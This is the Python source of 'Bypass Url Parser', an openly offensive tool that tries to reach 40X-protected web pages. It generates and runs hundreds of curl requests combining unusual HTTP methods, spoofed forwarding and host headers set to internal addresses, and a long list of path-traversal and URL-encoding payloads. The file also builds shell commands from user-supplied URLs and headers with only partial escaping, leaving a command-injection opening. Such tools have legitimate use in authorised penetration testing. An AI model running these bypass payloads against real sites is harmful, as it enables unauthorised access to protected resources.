#!/usr/bin/env python3
"""Bypass Url Parser, made with love by @TheLaluka
A tool that tests MANY url bypasses to reach a 40X protected page.

Usage:
    ./bypass-url-parser.py --url=<URL> [--outdir=<OUTDIR>] [--threads=<threads>] [(--header=<header>)...] [--debug]
    ./bypass-url-parser.py (-h | --help)
    ./bypass-url-parser.py (-v | --version)

Options:
    -h --help            Show help, you are here :)
    -v --version         Show version info.
    --url=<URL>          URL (path is optional) to run bypasses against.
    --outdir=<outdir>    Output directory for results.
    --threads=<threads>  Scan with N parallel threads [Default: 1].
    --header=<header>    Header(s) to use, format: "Cookie: can_i_haz=fire".
    --debug              Enable debugging output, to... Tou know... Debug.

Example:
    ./bypass-url-parser.py --url http://127.0.0.1/juicy_403_endpoint/
"""

from docopt import docopt
from pathlib import Path
from rich import print
from urllib.parse import urlparse
import coloredlogs
import hashlib
import logging
import os
import re
import subprocess
import sys
import tempfile

VERSION = "0.1.0"
logger = logging.getLogger("bup")
config = dict()

const_internal_ips = list()
const_internal_ips.append("0.0.0.0")
const_internal_ips.append("127.0.0.1")
const_internal_ips.append("localhost")
const_internal_ips.append("norealhost")

const_http_methods = list()
const_http_methods.append("CONNECT")
const_http_methods.append("GET")
const_http_methods.append("LOCK")
const_http_methods.append("OPTIONS")
const_http_methods.append("PATCH")
const_http_methods.append("POST")
const_http_methods.append("POUET")
const_http_methods.append("PUT")
const_http_methods.append("TRACE")
const_http_methods.append("TRACK")
const_http_methods.append("UPDATE")

const_header_schemes = list()
const_header_schemes.append("X-Forwarded-Scheme")  # http https

const_protos = list()
const_protos.append("http")
const_protos.append("https")
const_protos.append("foo")

const_header_ports = list()
const_header_ports.append("X-Forwarded-Port")

const_prorts = list()
const_prorts.append("443")
const_prorts.append("4443")
const_prorts.append("80")
const_prorts.append("8080")
const_prorts.append("8443")

const_header_hosts = list()
const_header_hosts.append("Access-Control-Allow-Origin")
const_header_hosts.append("Base-Url")
const_header_hosts.append("CF-Connecting_IP")
const_header_hosts.append("CF-Connecting-IP")
const_header_hosts.append("Client-IP")
const_header_hosts.append("Content-Length")
const_header_hosts.append("Destination")
const_header_hosts.append("Forwarded")
const_header_hosts.append("Forwarded-For")
const_header_hosts.append("Forwarded-For-IP")
const_header_hosts.append("Host")
const_header_hosts.append("Http-Url")
const_header_hosts.append("Origin")
const_header_hosts.append("Profile")
const_header_hosts.append("Proxy")
const_header_hosts.append("Proxy-Host")
const_header_hosts.append("Proxy-Url")
const_header_hosts.append("Real-Ip")
const_header_hosts.append("Redirect")
const_header_hosts.append("Referer")
const_header_hosts.append("Referrer")
const_header_hosts.append("Request-Uri")
const_header_hosts.append("True-Client-IP")
const_header_hosts.append("Uri")
const_header_hosts.append("Url")
const_header_hosts.append("X-Arbitrary")
const_header_hosts.append("X-Client-IP")
const_header_hosts.append("X-Custom-IP-Authorization")
const_header_hosts.append("X-Forward-For")
const_header_hosts.append("X-Forwarded")
const_header_hosts.append("X-Forwarded-By")
const_header_hosts.append("X-Forwarded-For")
const_header_hosts.append("X-Forwarded-For-Original")
const_header_hosts.append("X-Forwarded-Host")
const_header_hosts.append("X-Forwarded-Proto")
const_header_hosts.append("X-Forwarded-Server")
const_header_hosts.append("X-Forwarder-For")
const_header_hosts.append("X-Host")
const_header_hosts.append("X-Http-Destinationurl")
const_header_hosts.append("X-HTTP-DestinationURL")
const_header_hosts.append("X-Http-Host-Override")
const_header_hosts.append("X-OReferrer")
const_header_hosts.append("X-Original-Remote-Addr")
const_header_hosts.append("X-Original-URL")
const_header_hosts.append("X-Originally-Forwarded-For")
const_header_hosts.append("X-Originating-")
const_header_hosts.append("X-Originating-IP")
const_header_hosts.append("X-Proxy-Url")
const_header_hosts.append("X-ProxyUser-Ip")
const_header_hosts.append("X-Real-Ip")
const_header_hosts.append("X-Remote-Addr")
const_header_hosts.append("X-Remote-IP")
const_header_hosts.append("X-Rewrite-URL")
const_header_hosts.append("X-WAP-Profile")

const_paths = list()
const_paths.append(";")
const_paths.append(";/.;.")
const_paths.append(";/..")
const_paths.append(";/..;")
const_paths.append(";/../")
const_paths.append(";/../;/")
const_paths.append(";/../;/../")
const_paths.append(";/../.;/../")
const_paths.append(";/../../")
const_paths.append(";/../..//")
const_paths.append(";/.././../")
const_paths.append(";/..//")
const_paths.append(";/..//../")
const_paths.append(";/..///")
const_paths.append(";/..//%2e%2e/")
const_paths.append(";/..//%2f")
const_paths.append(";/../%2f/")
const_paths.append(";/..%2f")
const_paths.append(";/..%2f..%2f")
const_paths.append(";/..%2f/")
const_paths.append(";/..%2f//")
const_paths.append(";/..%2f%2f../")
const_paths.append(";/.%2e")
const_paths.append(";/.%2e/%2e%2e/%2f")
const_paths.append(";//..")
const_paths.append(";//../../")
const_paths.append(";///..")
const_paths.append(";///../")
const_paths.append(";///..//")
const_paths.append(";//%2f../")
const_paths.append(";/%2e.")
const_paths.append(";/%2e%2e")
const_paths.append(";/%2e%2e/")
const_paths.append(";/%2e%2e%2f/")
const_paths.append(";/%2e%2e%2f%2f")
const_paths.append(";/%2f/../")
const_paths.append(";/%2f/..%2f")
const_paths.append(";/%2f%2f../")
const_paths.append(";%09")
const_paths.append(";%09;")
const_paths.append(";%09..")
const_paths.append(";%09..;")
const_paths.append(";%2f;/;/..;/")
const_paths.append(";%2f;//../")
const_paths.append(";%2f..")
const_paths.append(";%2f..;/;//")
const_paths.append(";%2f..;//;/")
const_paths.append(";%2f..;///")
const_paths.append(";%2f../;/;/")
const_paths.append(";%2f../;/;/;")
const_paths.append(";%2f../;//")
const_paths.append(";%2f..//;/")
const_paths.append(";%2f..//;/;")
const_paths.append(";%2f..//../")
const_paths.append(";%2f..//..%2f")
const_paths.append(";%2f..///")
const_paths.append(";%2f..///;")
const_paths.append(";%2f../%2f../")
const_paths.append(";%2f../%2f..%2f")
const_paths.append(";%2f..%2f..%2f%2f")
const_paths.append(";%2f..%2f/")
const_paths.append(";%2f..%2f/../")
const_paths.append(";%2f..%2f/..%2f")
const_paths.append(";%2f..%2f%2e%2e%2f%2f")
const_paths.append(";%2f/;/..;/")
const_paths.append(";%2f/;/../")
const_paths.append(";%2f//..;/")
const_paths.append(";%2f//../")
const_paths.append(";%2f//..%2f")
const_paths.append(";%2f/%2f../")
const_paths.append(";%2f%2e%2e")
const_paths.append(";%2f%2e%2e%2f%2e%2e%2f%2f")
const_paths.append(";%2f%2f/../")
const_paths.append(";x")
const_paths.append(";x;")
const_paths.append(";x/")
const_paths.append("?")
const_paths.append("??")
const_paths.append("???")
const_paths.append("..")
const_paths.append("..;/")
const_paths.append("..;\\;")
const_paths.append("..;\\\\")
const_paths.append("..;%00/")
const_paths.append("..;%0d/")
const_paths.append("..;%ff/")
const_paths.append("../")
const_paths.append(".././")
const_paths.append("..\\;")
const_paths.append("..\\\\")
const_paths.append("..%00;/")
const_paths.append("..%00/")
const_paths.append("..%00/;")
const_paths.append("..%09")
const_paths.append("..%0d;/")
const_paths.append("..%0d/")
const_paths.append("..%0d/;")
const_paths.append("..%2f")
const_paths.append("..%5c")
const_paths.append("..%5c/")
const_paths.append("..%ff")
const_paths.append("..%ff;/")
const_paths.append("..%ff/;")
const_paths.append("./.")
const_paths.append(".//./")
const_paths.append(".%2e/")
const_paths.append(".html")
const_paths.append(".json")
const_paths.append("/")
const_paths.append("/;/")
const_paths.append("/;//")
const_paths.append("/;x")
const_paths.append("/;x/")
const_paths.append("/.")
const_paths.append("/.;/")
const_paths.append("/.;//")
const_paths.append("/..")
const_paths.append("/..;/")
const_paths.append("/..;/;/")
const_paths.append("/..;/;/..;/")
const_paths.append("/..;/..;/")
const_paths.append("/..;/../")
const_paths.append("/..;//")
const_paths.append("/..;//..;/")
const_paths.append("/..;//../")
const_paths.append("/..;%2f")
const_paths.append("/..;%2f..;%2f")
const_paths.append("/..;%2f..;%2f..;%2f")
const_paths.append("/../")
const_paths.append("/../;/")
const_paths.append("/../;/../")
const_paths.append("/../.;/../")
const_paths.append("/../..;/")
const_paths.append("/../../")
const_paths.append("/../../../")
const_paths.append("/../../..//")
const_paths.append("/../..//")
const_paths.append("/../..//../")
const_paths.append("/.././../")
const_paths.append("/..//")
const_paths.append("/..//..;/")
const_paths.append("/..//../")
const_paths.append("/..//../../")
const_paths.append("/..%2f")
const_paths.append("/..%2f..%2f")
const_paths.append("/..%2f..%2f..%2f")
const_paths.append("/./")
const_paths.append("/.//")
const_paths.append("/.randomstring")
const_paths.append("/*")
const_paths.append("/*/")
const_paths.append("//")
const_paths.append("//;/")
const_paths.append("//?anything")
const_paths.append("//.")
const_paths.append("//.;/")
const_paths.append("//..")
const_paths.append("//..;")
const_paths.append("//../../")
const_paths.append("//./")
const_paths.append("///..")
const_paths.append("///..;")
const_paths.append("///..;/")
const_paths.append("///..;//")
const_paths.append("///../")
const_paths.append("///..//")
const_paths.append("////")
const_paths.append("/%20#")
const_paths.append("/%20%20/")
const_paths.append("/%20%23")
const_paths.append("/%252e/")
const_paths.append("/%252e%252e%252f/")
const_paths.append("/%252e%252e%253b/")
const_paths.append("/%252e%252f/")
const_paths.append("/%252e%253b/")
const_paths.append("/%252f")
const_paths.append("/%2e/")
const_paths.append("/%2e//")
const_paths.append("/%2e%2e")
const_paths.append("/%2e%2e/")
const_paths.append("/%2e%2e%3b/")
const_paths.append("/%2e%2f/")
const_paths.append("/%2e%3b/")
const_paths.append("/%2e%3b//")
const_paths.append("/%2f")
const_paths.append("/%3b/")
const_paths.append("/x/;/..;/")
const_paths.append("/x/;/../")
const_paths.append("/x/..;/")
const_paths.append("/x/..;/;/")
const_paths.append("/x/..;//")
const_paths.append("/x/../")
const_paths.append("/x/../;/")
const_paths.append("/x/..//")
const_paths.append("/x//..;/")
const_paths.append("/x//../")
const_paths.append("\\..\\.\\")
const_paths.append("&")
const_paths.append("#")
const_paths.append("#?")
const_paths.append("%")
const_paths.append("%09")
const_paths.append("%09;")
const_paths.append("%09..")
const_paths.append("%09%3b")
const_paths.append("%20")
const_paths.append("%20/")
const_paths.append("%23")
const_paths.append("%23%3f")
const_paths.append("%252f/")
const_paths.append("%252f%252f")
const_paths.append("%26")
const_paths.append("%2e")
const_paths.append("%2e%2e")
const_paths.append("%2e%2e/")
const_paths.append("%2e%2e%2f")
const_paths.append("%2f")
const_paths.append("%2f/")
const_paths.append("%2f%20%23")
const_paths.append("%2f%23")
const_paths.append("%2f%2f")
const_paths.append("%2f%3b%2f")
const_paths.append("%2f%3b%2f%2f")
const_paths.append("%2f%3f")
const_paths.append("%2f%3f/")
const_paths.append("%3b")
const_paths.append("%3b/..")
const_paths.append("%3b//%2f../")
const_paths.append("%3b/%2e.")
const_paths.append("%3b/%2e%2e/..%2f%2f")
const_paths.append("%3b/%2f%2f../")
const_paths.append("%3b%09")
const_paths.append("%3b%2f..")
const_paths.append("%3b%2f%2e.")
const_paths.append("%3b%2f%2e%2e")
const_paths.append("%3b%2f%2e%2e%2f%2e%2e%2f%2f")
const_paths.append("%3f")
const_paths.append("%3f%23")
const_paths.append("%3f%3f")


class Bypasser:
    def __init__(self, config):
        self.url = config.get("url")
        self.outdir = config.get("outdir")
        self.debug = config.get("debug")
        self.curls = list()
        self.results = dict()
        self.clean_output = dict()

    def __str__(self):
        out = str()
        out += f"url: {self.url}\n"
        out += f"outdir: {self.outdir}\n"
        out += f"debug: {self.debug}\n"
        out += f"curls: {len(self.curls)}\n"
        out += f"results: {len(self.results)}\n"
        out += f"clean_output: {len(self.clean_output)}\n"
        return out

    def generate_curls(self):
        logger.warning("Stage: generate_curls")
        split_at = re.search(r"^https?://[^/]+", config["url"], re.IGNORECASE).span()[1]
        full_url = config["url"].replace(
            "'", "%27"
        )  # Dirty af but shitty escaping issues in bash -c
        base_url = config["url"][:split_at].replace(
            "'", "%27"
        )  # Dirty af but shitty escaping issues in bash -c
        base_path = config["url"][split_at:].replace(
            "'", "%27"
        )  # Dirty af but shitty escaping issues in bash -c
        logger.info(f"base_url: {base_url}")
        logger.info(f"base_path: {base_path}")

        header_user_agent = "-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36'"
        option_status = "-w '\\nStatus: %{http_code}, Length: %{size_download}'"
        base_curl = f"curl -sS -kgi --path-as-is {header_user_agent} {option_status}"

        for key, value in config["headers"].items():
            base_curl += f" -H '{key}: {value}'"

        # Original request
        self.curls.append(f"{base_curl} '{full_url}'")

        # Custom methods
        for const_http_method in const_http_methods:
            self.curls.append(f"{base_curl} -X '{const_http_method}' '{full_url}'")

        # Custom host injection headers
        for const_header_host in const_header_hosts:
            for const_internal_ip in const_internal_ips:
                self.curls.append(
                    f"{base_curl} -H '{const_header_host}: {const_internal_ip}' '{full_url}'"
                )

        # Custom proto rewrite
        for const_header_scheme in const_header_schemes:
            for const_proto in const_protos:
                self.curls.append(
                    f"{base_curl} -H '{const_header_scheme}: {const_proto}' '{full_url}'"
                )

        # Custom port rewrite
        for const_header_port in const_header_ports:
            for const_prort in const_prorts:
                self.curls.append(
                    f"{base_curl} -H '{const_header_port}: {const_prort}' '{full_url}'"
                )

        # Custom paths
        for const_path in const_paths:
            self.curls.append(f"{base_curl} '{base_url}/{const_path}{base_path}'")
            self.curls.append(f"{base_curl} '{base_url}/{base_path}{const_path}'")
            self.curls.append(f"{base_curl} '{base_url}/{base_path}/{const_path}'")

        # Custom paths with extra-mid-slash
        slash_indexes = [span.start() for span in re.finditer(r"/", base_path)]
        slash_indexes.remove(0)  # Already dealt with in other cases
        for slash_index in slash_indexes:
            for const_path in const_paths:
                self.curls.append(
                    f"{base_curl} '{base_url}/{base_path[:slash_index+1]}/{const_path}/{base_path[slash_index:]}'"
                )

        # IDEA Generate moooooore with cross products?
        # Not doing for now, already so many curls.. :)
        return

    def run_curls(self):
        logger.warning("Stage: run_curls")

        for curl in self.curls:
            logger.info(f"Current: {curl}")
            try:
                self.results[curl] = (
                    subprocess.check_output(["sh", "-c", curl], timeout=2).decode()
                    + f"\n|{curl}"
                )
            except subprocess.CalledProcessError as e:
                logger.warning(
                    f"command '{e.cmd}' returned on-zero error code {e.returncode}: {e.output}"
                )
            except subprocess.TimeoutExpired as e:
                logger.warning(f"command '{e.cmd}' timed out: {e.output}")
        return

    def save_and_quit(self):
        logger.warning("Stage: save_and_quit")
        padding = len(str(max([_.count(" ") for _ in self.results.values()])))
        for cmd, output in self.results.items():
            filename = hashlib.md5(cmd.encode()).hexdigest() + ".html"
            with open(f"{config['outdir']}/{filename}", "w") as f:
                f.write(output)
            count_words = output.count(" ")
            count_lines = output.count("\n")
            key_for_unicity = f"{count_lines:{padding}}:{count_words:{padding}}"
            self.clean_output[key_for_unicity] = filename

        self.clean_output = dict(sorted(self.clean_output.items()))

        clean_output = "\n".join(
            [f"{stats} - {filename}" for stats, filename in self.clean_output.items()]
        )
        logger.info(f"Saving html pages and short output in: {config['outdir']}")
        logger.info(
            f"Triaged results shows the following distinct pages:\n" + clean_output
        )
        logger.info(
            f"Also, inspect them manually with batcat:\necho {config['outdir']}/{{{','.join(self.clean_output.values())}}} | xargs bat"
        )
        # import ipdb; ipdb.set_trace()
        return


def main():
    global config
    # Show all options by Default
    if len(sys.argv) == 1:
        sys.argv.append("-h")
    arguments = docopt(__doc__, version=f"bypass-url-parser {VERSION}")

    # debug
    config["debug"] = arguments.get("--debug")

    # Log level
    coloredlogs.install(
        logger=logger, level=logging.DEBUG if config["debug"] else logging.INFO
    )

    if config["debug"]:
        logger.debug(f"arguments: {arguments}")

    try:
        config["url"] = arguments.get("--url")
        if not re.match(r"^https?://[^/]+/", config["url"], re.IGNORECASE):
            raise Exception(
                "Url must start with http:// or https:// and contain at least 3 slashes"
            )
        parsed_url = urlparse(config["url"])
    except Exception as e:
        logger.error(f"Couldn't parse url, found {arguments.get('--url')}")
        logger.error(e)
        exit(42)

    # outdir
    try:
        if not arguments.get("--outdir"):
            config["outdir"] = f"{tempfile.TemporaryDirectory().name}-bypass-url-parser"
        else:
            config["outdir"] = arguments.get("--outdir")
        Path(config["outdir"]).mkdir(parents=True, exist_ok=True)
    except Exception as e:
        logger.error("Error while creating output directory")
        logger.error(e)
        exit(42)

    # threads
    try:
        config["threads"] = int(arguments.get("--threads"), 10)
    except Exception as e:
        logger.error("Invalid number of threads")
        logger.error(e)
        exit(42)

    # threads
    config["headers"] = dict()
    try:
        for header in arguments.get("--header") or list():
            key, value = header.split(":", 1)
            if "'" in key or "'" in value:
                raise Exception("Single quotes in args are currently unsupported")
            config["headers"][key] = value.strip()
    except Exception as e:
        print("Error setting custom headers")
        print(e)
        exit(42)

    logger.info("=== Config ===")
    for key, val in config.items():
        logger.info(f"{key}: {val}")

    exporter = Bypasser(config)
    exporter.generate_curls()
    exporter.run_curls()
    exporter.save_and_quit()


if __name__ == "__main__":
    main()
